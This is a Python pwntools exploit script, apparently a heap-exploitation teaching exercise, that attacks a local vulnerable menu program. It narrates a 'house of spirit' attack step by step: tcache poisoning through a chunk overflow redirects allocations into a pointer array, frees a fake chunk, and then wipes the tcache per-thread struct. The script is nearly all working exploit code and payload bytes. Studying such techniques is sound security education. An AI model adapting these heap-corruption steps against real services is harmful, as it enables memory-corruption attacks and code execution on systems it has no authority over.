#!/usr/bin/env python2
from pwn import *
import re

host = '127.0.0.1'
port = 1234

conn = remote(host,port)
data = conn.recv()

pass_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
ptrs_addr = re.findall(r'\(.+\)', data.splitlines()[1])[0][1:-1]
tmp_addr = re.findall(r'\(.+\)', data.splitlines()[2])[0][1:-1]

print ""
print "House of spirit"
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "pass is at : %s" % pass_addr
print "ptrs is at : %s" % ptrs_addr
print " tmp is at : %s" % tmp_addr
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print ""

print "We want to overwrite ptr index array and point to tmp in one of its index"
print "It will allow us to free a fake chunk stored in tmp"
print "Once we free this fake size tmp, next malloc of this size will take place there"
print ""
print "The ability to overflow all chunks, make this example only ilustrative and innecessary"
print "We try to show how to use a pointer to control the flow of the heap"
print ""
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "1) In first place we will use tcache poisoning to alter ptrs indexes"
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print ""

print "1.1 ask for 0x20 bytes (chunk 1)"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
fc_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s" % fc_addr
print ""
fc_addr =int(fc_addr,16)

print "1.2 ask for 0x20 more bytes (chunk 2)"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
sc_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s" % sc_addr
print ""
sc_addr =int(sc_addr,16)

print "1.3 chunk 2 is freed"
print ""
conn.send("2\n")
sleep(0.1)
data = conn.recv()
conn.send("2\n")
sleep(0.1)
data = conn.recv()

print "1.4 overflow first chunk to set at chunk 2 fd our target, ptrs array + 0x10 (1st index)"
print ""
conn.send("3\n")
sleep(0.1)
data = conn.recv()
conn.send("1\n")
sleep(0.1)
data = conn.recv()
ptrs_addr = int(ptrs_addr, 16)
conn.send(p64(0x0) * 4 + p64(0x31) + p64(0x31) + p64(ptrs_addr + 0x10))
sleep(0.1)
data = conn.recv()

print "1.5 Malloc our fake size to reallocate chunk 2"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
ra_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s " % ra_addr
print ""

print "1.6 Malloc a new chunk of fake size. It will point to our target, ptrs[1]"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
ra_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s " % ra_addr
print ""

print "1.7 Overwrite the address with tmps"
conn.send("3\n")
sleep(0.1)
data = conn.recv()
conn.send("3\n")
sleep(0.1)
data = conn.recv()
tmp_addr = int(tmp_addr,16)
conn.send(p64(tmp_addr + 0x10))
sleep(0.1)
data = conn.recv()

print ""
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "2) We build a fake chunk at tmp"
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print ""

conn.send("7\n")
data = conn.recv()
conn.send("12345678"+ p64(0x110) + "AAAAAAAA")
data = conn.recv()

print ""
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "3) Free our fake chunk via ptrs index"
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print ""

conn.send("2\n")
data = conn.recv()
conn.send("2\n")
data = conn.recv()

print ""
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "4) Malloc our fake size"
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print ""

data = conn.recv()
conn.send("1\n")
data = conn.recv()
conn.send(str(0x100)+"\n")
data = conn.recv()
print data

print ""
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "5) To exit clean, we need overwrite to 0x0 pthread_tcache struct"
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print ""

print "5.1 chunk 2 is freed again"
print ""
conn.send("2\n")
sleep(0.1)
data = conn.recv()
conn.send("2\n")
sleep(0.1)
data = conn.recv()

print "5.2 overflow first chunk to set chunk2->fd at pthread_struct"
print ""
conn.send("3\n")
sleep(0.1)
data = conn.recv()
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(p64(0x0) * 4 + p64(0x31) + p64(0x31) + p64(fc_addr-0x250))
sleep(0.1)
data = conn.recv()

print "5.3 Malloc to reallocate chunk 2"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
ra_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s " % ra_addr
print ""

print "5.4 Malloc new chunk of fake size. It will point to pthread_struct"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
ra_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s " % ra_addr
print ""

print "5.5 Fill the perthred struct with 0x0s"
conn.send("3\n")
sleep(0.1)
data = conn.recv()
conn.send("4\n")
sleep(0.1)
data = conn.recv()
conn.send(p64(0x0) * 25)
sleep(0.1)
data = conn.recv()

raw_input ("press any key")
conn.send("8\n")
